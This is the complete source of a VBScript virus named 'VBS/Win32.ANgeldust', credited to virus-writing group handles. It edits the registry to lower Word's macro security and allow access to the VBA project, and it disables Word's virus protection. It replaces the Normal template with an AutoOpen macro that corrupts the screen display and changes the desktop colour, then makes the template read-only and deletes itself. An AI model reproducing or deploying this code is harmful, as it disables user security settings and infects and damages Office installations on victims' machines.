On Error Resume Next
'VBS/Win32.ANgeldust
'(c)by Necronomikon/DCA/Zer0Gravity
Set fso = CreateObject("Scripting.FileSystemObject")
Set WinDir = fso.GetSpecialFolder(0)
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
Set Backup = WScript.CreateObject("Word.Application")
Backup.Options.VirusProtection = (Rnd * 0)
Backup.Options.SaveNormalPrompt = (Rnd * 0)
Set babe = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead16 = babe.ReadAll
babe.Close

Set DropFile = FSO.CreateTextFile("c:\angeldust.dat", True)
DropFile.WriteLine "Public Declare Function GetDC Lib ""user32"" (ByVal hwnd As Long) As Long"
DropFile.WriteLine "Public Declare Function BitBlt Lib ""gdi32"" (ByVal hDestDC As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long"
DropFile.WriteLine "Sub AutoOpen()"
DropFile.WriteLine "On Error Resume Next"
DropFile.WriteLine "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Angeldust"", ""Angeldust"") = ""by Necronomikon[DCA]"""
DropFile.WriteLine "Application.WindowState = wdWindowStateMinimize"
DropFile.WriteLine "Randomize"
DropFile.WriteLine "For graf = 1 To 2200"
DropFile.WriteLine "Randomize"
DropFile.WriteLine "c = GetDC(0)"
DropFile.WriteLine "x = Int(Rnd * 600) + 1"
DropFile.WriteLine "Y = Int(Rnd * 800) + 1"
DropFile.WriteLine "X1 = x + 1"
DropFile.WriteLine "Y1 = Y + 1"
DropFile.WriteLine "c = BitBlt(c, Y1, X1, 20, 20, c, Y, x, -3)"
DropFile.WriteLine "Next graf"
DropFile.WriteLine "MsgBox ""Feel the white power..."", vbCritical, ""VBS/Win32.Angeldust"""
DropFile.WriteLine "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Control Panel\Colors\"", ""Background"") = ""255 255 255"""
DropFile.WriteLine "Application.WindowState = wdWindowStateNormal"
DropFile.WriteLine "End Sub"
DropFile.Close

Backup.Visible = False
Set nt = Backup.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\angeldust.dat", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
Backup.NormalTemplate.Save
SetAttr oword.NormalTemplate.Fullname, vbReadOnly
Backup.NormalTemplate.Close
fso.DeleteFile wscript.ScriptFullName